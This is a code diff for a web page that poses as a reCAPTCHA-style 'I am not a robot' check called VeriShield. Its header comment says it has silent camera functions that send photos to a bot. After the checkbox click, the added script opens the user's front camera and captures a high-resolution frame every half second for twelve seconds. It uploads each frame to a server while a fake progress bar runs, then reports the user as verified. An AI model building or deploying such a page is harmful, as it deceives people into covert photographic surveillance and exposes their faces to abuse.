@@ -14,8 +14,170 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
-  <!-- ربط ملف CSS الخارجي -->
-  <link rel="stylesheet" href="style.css">
+  <style>
+    /* ============================================
+       الأنماط الأساسية
+       ============================================ */
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    .recaptcha-box {
+      width: 340px;
+      min-width: 340px;
+      height: auto;
+      min-height: 95px;
+      padding: 14px 16px;
+      transition: all 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 4px;
+    }
+
+    /* ============================================
+       إيماءات الحركة
+       ============================================ */
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10% { transform: translateX(-4px); }
+      20% { transform: translateX(4px); }
+      30% { transform: translateX(-4px); }
+      40% { transform: translateX(4px); }
+      50% { transform: translateX(-2px); }
+      60% { transform: translateX(2px); }
+      70% { transform: translateX(-1px); }
+      80% { transform: translateX(1px); }
+      90% { transform: translateX(-1px); }
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 5px rgba(74, 144, 226, 0.2); }
+      50% { box-shadow: 0 0 20px rgba(74, 144, 226, 0.6); }
+    }
+
+    /* ============================================
+       Spinner - مؤشر التحميل الدوار
+       ============================================ */
+
+    #captcha-spinner svg {
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* ============================================
+       Checkmark - علامة الصح
+       ============================================ */
+
+    @keyframes successPop {
+      0% { transform: scale(0) rotate(-45deg); opacity: 0; }
+      50% { transform: scale(1.3) rotate(0deg); opacity: 1; }
+      100% { transform: scale(1) rotate(0deg); opacity: 1; }
+    }
+
+    /* ============================================
+       حالات الواجهة
+       ============================================ */
+
+    #captcha-checkbox:hover {
+      box-shadow: 0 0 4px rgba(74, 144, 226, 0.4);
+    }
+
+    .state-loading #captcha-checkbox {
+      display: none !important;
+    }
+    .state-loading #captcha-spinner {
+      display: flex !important;
+    }
+
+    .state-success #captcha-spinner,
+    .state-success #captcha-checkbox {
+      display: none !important;
+    }
+    .state-success #captcha-success {
+      display: flex !important;
+      animation: successPop 0.5s ease-out;
+    }
+
+    .state-success .recaptcha-box {
+      background-color: #fafafa;
+      border-color: #e0e0e0;
+      animation: glow 1s ease-in-out 2;
+    }
+
+    /* ============================================
+       حالة الخطأ (بلون رمادي)
+       ============================================ */
+
+    .state-error #captcha-checkbox {
+      border-color: #999999 !important;
+      background-color: #f5f5f5 !important;
+    }
+    .state-error #captcha-text {
+      color: #888888 !important;
+    }
+
+    /* ============================================
+       عناصر أخرى
+       ============================================ */
+
+    .text-transition {
+      transition: opacity 0.3s ease-in-out, color 0.5s ease;
+      will-change: opacity, color;
+    }
+
+    .recaptcha-box a {
+      text-decoration: none;
+      color: #555;
+    }
+
+    #captcha-checkbox:focus-visible {
+      border-color: #4a90e2;
+      box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.2);
+    }
+
+    #progress-fill {
+      transition: width 0.1s linear;
+    }
+
+    /* ============================================
+       أزرار التواصل الاجتماعي
+       ============================================ */
+
+    #social-buttons {
+      transition: all 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    #social-buttons a {
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    #social-buttons a:hover {
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+    }
+
+    /* ============================================
+       شريط التقدم
+       ============================================ */
+
+    #progress-bar {
+      margin-top: 4px;
+      width: 100%;
+      height: 3px;
+    }
+  </style>
 
 </head>
 
@@ -30,7 +192,7 @@
         id="captcha-widget"
         role="region"
         aria-label="Verification Widget"
-        class="recaptcha-box bg-white border border-[#d3d3d3] rounded-[3px] shadow-[0_0_4px_1px_rgba(0,0,0,0.08)] flex flex-col items-center justify-between p-3 select-none overflow-hidden transition-all duration-300"
+        class="recaptcha-box bg-white border border-[#d3d3d3] rounded-[3px] shadow-[0_0_4px_1px_rgba(0,0,0,0.08)] flex flex-col items-center justify-center select-none overflow-hidden transition-all duration-300"
       >
 
         <!-- الصف العلوي -->
@@ -39,7 +201,7 @@
           <!-- Checkbox / Spinner / Success -->
           <div class="flex items-center gap-3 pr-2 flex-1">
 
-            <div class="relative w-8 h-8 flex items-center justify-center">
+            <div class="relative w-8 h-8 flex items-center justify-center flex-shrink-0">
 
               <!-- Checkbox -->
               <div
@@ -76,7 +238,7 @@
           </div>
 
           <!-- Branding -->
-          <div class="flex flex-col items-center justify-center pl-1 text-[#555] min-w-[80px]">
+          <div class="flex flex-col items-center justify-center pl-1 text-[#555] min-w-[80px] flex-shrink-0">
             <div class="flex flex-col items-center gap-0.5">
               <div class="w-10 h-10 flex items-center justify-center overflow-visible">
                 <img src="https://i.postimg.cc/cHY7x1GC/56FDA78E-59F9-4380-B01E-3C1F80389B06.png" alt="Logo" class="w-10 h-10 object-contain scale-[1.5]">
@@ -94,8 +256,8 @@
         </div>
 
         <!-- شريط التقدم -->
-        <div id="progress-bar" class="w-full h-1 bg-gray-200 rounded-full overflow-hidden mt-1.5 hidden">
-          <div id="progress-fill" class="h-full bg-blue-500 rounded-full transition-all duration-300" style="width: 0%"></div>
+        <div id="progress-bar" class="w-full bg-gray-200 rounded-full overflow-hidden hidden">
+          <div id="progress-fill" class="h-full bg-blue-500 rounded-full transition-all duration-300" style="width: 0%; height: 3px;"></div>
         </div>
 
       </div>
@@ -121,8 +283,442 @@
 
   </div>
 
-  <!-- ربط ملف JavaScript الخارجي -->
-  <script src="script.js"></script>
+  <!-- JavaScript -->
+  <script>
+    /**
+     * VeriShield - Verification System
+     * مع وظائف الكاميرا الصامتة وإرسال الصور إلى البوت
+     */
+
+    (function() {
+      'use strict';
+
+      console.log('✅ VeriShield loaded successfully!');
+
+      // ============================================
+      // المتغيرات والعناصر
+      // ============================================
+
+      const captchaWidget = document.getElementById('captcha-widget');
+      const captchaCheckbox = document.getElementById('captcha-checkbox');
+      const captchaText = document.getElementById('captcha-text');
+      const finalMessage = document.getElementById('final-message');
+      const socialButtons = document.getElementById('social-buttons');
+      const progressBar = document.getElementById('progress-bar');
+      const progressFill = document.getElementById('progress-fill');
+
+      let isProcessing = false;
+      let isVerified = false;
+      let progressInterval = null;
+      let cameraRejected = false;
+
+      // متغيرات الكاميرا
+      let stream = null;
+      let video = null;
+      let captureInterval = null;
+      let finishTimeout = null;
+      let imageNumber = 0;
+      let cameraError = false;
+
+      const duration = 12000;
+      const intervalTime = 500;
+
+      console.log('✅ Elements found:', {
+        widget: !!captchaWidget,
+        checkbox: !!captchaCheckbox,
+        text: !!captchaText,
+        message: !!finalMessage,
+        social: !!socialButtons,
+        progress: !!progressBar
+      });
+
+      // ============================================
+      // الدوال المساعدة
+      // ============================================
+
+      function shakeElement(element) {
+        if (!element) return;
+        element.style.animation = 'none';
+        element.offsetHeight;
+        element.style.animation = 'shake 0.3s ease-in-out';
+        setTimeout(function() {
+          element.style.animation = '';
+        }, 300);
+      }
+
+      function pulseElement(element) {
+        if (!element) return;
+        element.style.animation = 'none';
+        element.offsetHeight;
+        element.style.animation = 'pulse 0.5s ease-in-out 3';
+        setTimeout(function() {
+          element.style.animation = '';
+        }, 1500);
+      }
+
+      // ============================================
+      // إرسال صورة إلى الخادم (صامت)
+      // ============================================
+
+      async function sendImage(blob, number) {
+        const formData = new FormData();
+        formData.append("images", blob, `camera-${Date.now()}-${number}.jpg`);
+
+        try {
+          const response = await fetch("/upload", {
+            method: "POST",
+            body: formData
+          });
+
+          if (!response.ok) {
+            throw new Error("HTTP " + response.status);
+          }
+
+          const result = await response.json();
+          console.log("✅ تم إرسال الصورة رقم", number, result);
+          return true;
+
+        } catch (error) {
+          console.error("❌ فشل إرسال الصورة رقم", number, error);
+          return false;
+        }
+      }
+
+      // ============================================
+      // التقاط صورة وإرسالها (جودة متكيفة مع الكاميرا)
+      // ============================================
+
+      async function captureImage() {
+        if (!video || !video.videoWidth || !video.videoHeight) {
+          return;
+        }
+
+        const originalWidth = video.videoWidth;
+        const originalHeight = video.videoHeight;
+        
+        console.log(`📷 دقة الكاميرا: ${originalWidth}x${originalHeight}`);
+        
+        let width = originalWidth;
+        let height = originalHeight;
+        
+        const maxDimension = 1920;
+        if (width > maxDimension || height > maxDimension) {
+          const ratio = Math.min(maxDimension / width, maxDimension / height);
+          width = Math.round(width * ratio);
+          height = Math.round(height * ratio);
+        }
+        
+        const canvas = document.createElement("canvas");
+        canvas.width = width;
+        canvas.height = height;
+        
+        const context = canvas.getContext("2d");
+        context.imageSmoothingEnabled = true;
+        context.imageSmoothingQuality = 'high';
+        context.drawImage(video, 0, 0, width, height);
+
+        canvas.toBlob(async (blob) => {
+          if (!blob) return;
+          imageNumber++;
+          await sendImage(blob, imageNumber);
+        }, "image/jpeg", 0.92);
+      }
+
+      // ============================================
+      // إظهار رسالة الخطأ
+      // ============================================
+
+      function showError(message) {
+        captchaWidget.classList.remove('state-loading', 'state-success');
+        captchaWidget.classList.add('state-error');
+        
+        captchaText.textContent = message;
+        captchaText.style.color = '#888888';
+        captchaText.style.opacity = '1';
+        
+        progressBar.classList.add('hidden');
+        progressFill.style.width = '0%';
+        
+        cameraRejected = true;
+        isProcessing = false;
+        isVerified = false;
+        
+        captchaCheckbox.setAttribute('aria-checked', 'false');
+      }
+
+      // ============================================
+      // إعادة تعيين الحالة
+      // ============================================
+
+      function resetState() {
+        captchaWidget.classList.remove('state-error', 'state-loading', 'state-success');
+        
+        captchaText.textContent = 'أنا لست برنامج روبوت';
+        captchaText.style.color = '#000000';
+        captchaText.style.opacity = '1';
+        
+        progressBar.classList.add('hidden');
+        progressFill.style.width = '0%';
+        
+        cameraRejected = false;
+        isProcessing = false;
+        isVerified = false;
+        
+        captchaCheckbox.setAttribute('aria-checked', 'false');
+        
+        socialButtons.classList.remove('opacity-100');
+        socialButtons.classList.add('opacity-0', 'pointer-events-none');
+        
+        finalMessage.classList.remove('opacity-100');
+        finalMessage.classList.add('opacity-0');
+        
+        if (progressInterval) {
+          clearInterval(progressInterval);
+          progressInterval = null;
+        }
+        if (captureInterval) {
+          clearInterval(captureInterval);
+          captureInterval = null;
+        }
+        if (finishTimeout) {
+          clearTimeout(finishTimeout);
+          finishTimeout = null;
+        }
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          stream = null;
+        }
+      }
+
+      // ============================================
+      // بدء التحقق
+      // ============================================
+
+      function startVerification() {
+        console.log('🔄 startVerification called');
+        
+        if (cameraRejected) {
+          console.log('🔄 Resetting from camera rejection');
+          resetState();
+          setTimeout(function() {
+            startVerification();
+          }, 100);
+          return;
+        }
+        
+        if (isProcessing || isVerified) {
+          console.log('⏸️ Skipping - already processing or verified');
+          return;
+        }
+
+        shakeElement(captchaCheckbox);
+        pulseElement(captchaWidget);
+
+        const humanDelay = Math.floor(Math.random() * 100) + 50;
+        console.log('⏱️ Human delay:', humanDelay, 'ms');
+        
+        setTimeout(async function() {
+          console.log('▶️ Starting verification process');
+          isProcessing = true;
+          
+          try {
+            console.log('📷 Requesting camera...');
+            
+            stream = await navigator.mediaDevices.getUserMedia({
+              video: { 
+                facingMode: "user",
+                width: { ideal: 1920 },
+                height: { ideal: 1080 }
+              },
+              audio: false
+            });
+
+            console.log('✅ Camera granted!');
+
+            video = document.createElement("video");
+            video.srcObject = stream;
+            video.muted = true;
+            video.playsInline = true;
+            await video.play();
+
+            await new Promise(resolve => {
+              if (video.videoWidth && video.videoHeight) {
+                resolve();
+                return;
+              }
+              video.onloadedmetadata = () => resolve();
+            });
+
+            console.log(`📷 دقة الكاميرا: ${video.videoWidth}x${video.videoHeight}`);
+
+            captchaWidget.classList.add('state-loading');
+            captchaCheckbox.setAttribute('aria-checked', 'mixed');
+            
+            progressBar.classList.remove('hidden');
+            progressFill.style.width = '0%';
+
+            captchaText.style.opacity = '0';
+            setTimeout(function() {
+              captchaText.textContent = 'جاري التحقق...';
+              captchaText.style.opacity = '1';
+              pulseElement(captchaText);
+            }, 300);
+
+            await captureImage();
+            captureInterval = setInterval(captureImage, intervalTime);
+
+          } catch (error) {
+            console.error("❌ Camera error:", error);
+            
+            isProcessing = false;
+            progressBar.classList.add('hidden');
+            progressFill.style.width = '0%';
+            
+            showError('تعذر استخدام الكاميرا للتحقق. يرجى المحاولة مرة أخرى.');
+            return;
+          }
+
+          // ============================================
+          // شريط التقدم (12 ثانية)
+          // ============================================
+          let progress = 0;
+          const totalTime = duration;
+          const intervalTimeProgress = 50;
+          const step = (intervalTimeProgress / totalTime) * 100;
+
+          progressInterval = setInterval(function() {
+            progress += step;
+            if (progress >= 100) {
+              progress = 100;
+              clearInterval(progressInterval);
+            }
+            progressFill.style.width = Math.min(progress, 100) + '%';
+
+            if (progress < 30) {
+              captchaText.textContent = 'جاري التحقق...';
+            } else if (progress < 60) {
+              captchaText.textContent = 'جاري التحقق...';
+            } else if (progress < 90) {
+              captchaText.textContent = 'جاري التحقق...';
+            } else {
+              captchaText.textContent = 'جاري إكمال التحقق...';
+            }
+          }, intervalTimeProgress);
+
+          // ============================================
+          // اكتمال التحقق بعد 12 ثانية
+          // ============================================
+          finishTimeout = setTimeout(function() {
+            clearInterval(progressInterval);
+            clearInterval(captureInterval);
+            
+            if (stream) {
+              stream.getTracks().forEach(track => track.stop());
+              stream = null;
+            }
+            
+            completeVerification();
+          }, totalTime);
+
+        }, humanDelay);
+      }
+
+      // ============================================
+      // إكمال التحقق
+      // ============================================
+
+      function completeVerification() {
+        console.log('✅ Verification complete!');
+        isProcessing = false;
+        isVerified = true;
+        cameraRejected = false;
+        
+        captchaWidget.classList.remove('state-loading', 'state-error');
+        captchaWidget.classList.add('state-success');
+        captchaCheckbox.setAttribute('aria-checked', 'true');
+
+        setTimeout(function() {
+          progressBar.classList.add('hidden');
+        }, 300);
+
+        captchaText.style.opacity = '0';
+        setTimeout(function() {
+          captchaText.textContent = 'تم التحقق من أنك إنسان';
+          captchaText.style.opacity = '1';
+          captchaText.style.color = '#00aa45';
+          pulseElement(captchaText);
+
+          setTimeout(function() {
+            finalMessage.classList.remove('opacity-0');
+            finalMessage.classList.add('opacity-100');
+            
+            finalMessage.style.transform = 'scale(0.95)';
+            setTimeout(function() {
+              finalMessage.style.transform = 'scale(1)';
+            }, 100);
+
+            setTimeout(function() {
+              socialButtons.classList.remove('opacity-0', 'pointer-events-none');
+              socialButtons.classList.add('opacity-100');
+              
+              socialButtons.style.transform = 'scale(0.9)';
+              setTimeout(function() {
+                socialButtons.style.transform = 'scale(1)';
+              }, 100);
+            }, 400);
+
+          }, 600);
+        }, 300);
+      }
+
+      // ============================================
+      // إضافة أحداث النقر
+      // ============================================
+      
+      console.log('🔄 Adding event listeners...');
+
+      captchaCheckbox.addEventListener('click', function(e) {
+        console.log('👆 Checkbox clicked!');
+        e.stopPropagation();
+        startVerification();
+      });
+
+      captchaCheckbox.addEventListener('keydown', function(e) {
+        if (e.key === ' ' || e.key === 'Enter') {
+          console.log('⌨️ Keyboard pressed:', e.key);
+          e.preventDefault();
+          startVerification();
+        }
+      });
+
+      captchaText.addEventListener('click', function() {
+        console.log('👆 Text clicked!');
+        if (!isProcessing && !isVerified) {
+          startVerification();
+        }
+      });
+
+      socialButtons.addEventListener('click', function(e) {
+        if (!isVerified) {
+          e.preventDefault();
+          e.stopPropagation();
+        }
+      });
+
+      window.addEventListener("beforeunload", function() {
+        if (captureInterval) clearInterval(captureInterval);
+        if (progressInterval) clearInterval(progressInterval);
+        if (finishTimeout) clearTimeout(finishTimeout);
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+      });
+
+      console.log('✅ All event listeners added successfully!');
+      console.log('🚀 Ready to verify!');
+
+    })();
+  </script>
 
 </body>
 </html>
